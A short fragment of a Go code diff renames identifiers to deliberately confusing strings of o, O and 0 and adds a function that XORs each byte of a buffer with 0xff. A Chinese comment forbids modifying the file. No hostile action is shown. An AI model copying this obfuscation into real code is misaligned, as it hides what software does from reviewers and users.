+	if len(o0oo0Oo0O0x) > 0 {
+		return o00Oo000Oo6.String()
 	}
-	return strings.ToLower(_16.String())
+	return strings.ToLower(o00Oo000Oo6.String())
+}
+func o0O00oo0OO(oOO0oO00oo []byte) []byte {
+	o0OOoOoOOo := oOO0oO00oo
+	for ooo00Ooooo, oOO0Ooo0OO := range o0OOoOoOOo {
+		o0OOoOoOOo[ooo00Ooooo] = oOO0Ooo0OO ^ 0xff
+	}
+	return o0OOoOoOOo
 }
 
 //请遵守开源协议,请勿修改此文件下的所有代码
